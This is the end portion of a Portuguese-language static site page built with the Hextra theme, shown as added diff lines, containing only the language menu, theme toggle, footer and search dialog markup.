+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-01-17-owasptop10-2020/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden">Claro</span><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden">Escuro</span><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+<span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden">Sistema</span></div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div><hr class="hx:border-gray-200 hx:dark:border-neutral-800" /><div class="hextra-custom-footer hextra-max-footer-width hx:mx-auto hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Com a tecnologia de Hextra<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <dialog
+    id="hextra-search-dialog"
+    class="hextra-search-dialog"
+    aria-label="Procurar..."
+  >
+    <div class="hextra-search">
+      <div class="hextra-search-input-wrapper"><svg class="hextra-search-input-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><input
+          class="hextra-search-input"
+          type="search"
+          role="combobox"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          placeholder="Procurar..."
+          aria-label="Procurar..."
+          aria-controls="hextra-search-results"
+          aria-expanded="false"
+        /><button
+          type="button"
+          class="hextra-search-input-kbd"
+          data-search-close
+          aria-label="Close"
+        >ESC</button>
+      </div>
+      <div class="hextra-search-results-viewport" data-search-viewport>
+        <div class="hextra-search-results-inner hextra-scrollbar" data-search-inner>
+          <ul
+            id="hextra-search-results"
+            class="hextra-search-results"
+            role="listbox"
+            aria-label="Resultados da pesquisa"
+          ></ul>
+          <div class="hextra-search-empty" data-search-empty hidden>Nenhum resultado encontrado</div>
+        </div>
+      </div>
+      <div class="hextra-search-status hx:sr-only" aria-live="polite" role="status"></div>
+    </div>
+  </dialog>
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script><script defer src="/pt.search.js" integrity=""></script>
+    <script defer src="/pt.search-dialog.js" integrity=""></script>
+  </body>
+</html>
